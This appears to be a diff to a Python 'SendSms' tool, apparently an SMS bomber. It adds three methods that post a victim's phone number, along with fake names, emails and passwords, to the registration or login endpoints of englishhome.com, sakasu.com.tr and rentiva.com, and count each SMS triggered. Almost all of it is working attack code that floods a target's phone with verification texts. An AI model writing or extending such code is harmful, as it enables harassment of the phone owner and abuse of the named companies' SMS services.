@@ -482,3 +482,45 @@ class SendSms():
                 raise 
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> a101.com.tr")
+
+
+    #englishhome.com--sms
+    def englishhome(self):
+        try:
+            data = {"first_name": "Memati", "last_name": "Bas", "email": f"{self.random_mail}@gmail.com", "phone": f"0{self.phone}", "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"}
+            home = requests.post("https://www.englishhome.com:443/enh_app/users/registration/", data=data)
+            if home.status_code == 202:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> englishhome.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> englishhome.com")
+            
+            
+    #sakasu.com.tr--sms
+    def sakasu(self):
+        try:
+            data = {"phone": self.phone}
+            su = requests.post("https://www.sakasu.com.tr:443/app/api_register/step1", data=data)
+            if su.json()["status"] == "ok":
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> sakasu.com.tr")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> sakasu.com.tr")
+            
+    
+    #rentiva.com--sms
+    def rentiva(self): 
+        try:
+            json={"phone": self.phone, "phonePeriod": "never"}
+            rentiva = requests.post("https://rentiva.com:443/api/Account/Login", json=json)
+            if rentiva.json()["success"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> rentiva.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> rentiva.com")
